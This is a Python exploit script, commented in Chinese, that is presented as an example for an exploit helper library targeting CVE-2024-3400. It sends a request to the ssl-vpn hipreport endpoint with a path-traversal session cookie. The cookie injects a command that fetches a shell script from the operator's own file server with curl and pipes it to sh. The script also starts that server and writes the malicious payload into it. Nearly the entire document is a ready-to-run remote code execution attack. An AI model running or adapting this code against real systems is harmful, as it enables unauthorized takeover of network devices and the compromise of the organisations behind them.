"""示例: CVE-2024-3400 的 exp"""

import logging

import exploit_utils as exp
from exploit_utils.http import URL, ContentType

# 获取 session
# 该对象已提前配置过: 随机 UA 头, 5s 超时, 关闭 SSL 证书验证
http = exp.http.get_session()
# 获取 logger, 记录日志
logger = exp.log.get_logger()


def attack(url: URL, lhost: str, lport: int) -> None:
    """主要攻击逻辑"""
    logger.info(f"start attack: {url}")
    # curl 获取命令并执行
    cmd = f"curl${{IFS}}{lhost}:{lport}/shell.sh|sh"
    # 发起恶意请求
    http.post(
        url=(url / "ssl-vpn" / "hipreport.esp").url,
        cookies={
            "SESSID": f"./../../../opt/panlogs/tmp/device_telemetry/minute/`{cmd}`"
        },
        headers={"Content-Type": ContentType.form},
    )


if __name__ == "__main__":
    # 获取命令行参数
    parser = exp.args.Parser()
    # 对于不满意的预设参数, 可以对其进行定制
    parser.load_args(
        [
            exp.args.URL({"required": True}),
            exp.args.COMMAND,
            exp.args.LHOST({"help": "文件服务器地址"}),
            exp.args.LPORT({"help": "文件服务器端口"}),
            exp.args.OUTPUT,
            exp.args.DEBUG,
        ]
    )
    args = parser.parse_args()
    # 关闭 http 警告
    exp.http.no_warn()
    # 设置日志输出文件
    if args.output:
        exp.log.add_outputfile(args.output)
    # 开启调试输出
    if args.debug:
        logger.set_level(logging.DEBUG)
    with (
        exp.fs.temp_dir() as temp_dir,  # 创建临时文件夹
        exp.fs.FileServer(
            port=args.lport, dir=temp_dir
        ),  # 以临时文件夹为根目录创建文件服务器
        open(temp_dir / "shell.sh", "w") as file,  # 在临时文件夹下添加恶意 shell 脚本
    ):
        # 写入恶意 shell 脚本内容
        file.write("#!/bin/sh\n" + args.command)
        attack(URL(args.url), args.lhost, args.lport)
